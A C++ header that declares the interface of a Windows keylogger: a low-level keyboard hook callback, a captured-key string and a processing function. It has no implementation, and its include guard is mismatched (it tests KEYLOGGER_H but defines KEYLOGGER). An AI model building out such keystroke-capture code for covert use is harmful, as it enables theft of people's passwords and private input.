#ifndef KEYLOGGER_H
#define KEYLOGGER
#include <windows.h>
#include <string>

namespace keylogger {
	extern std::string key;
	LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
	void process();
}

#endif
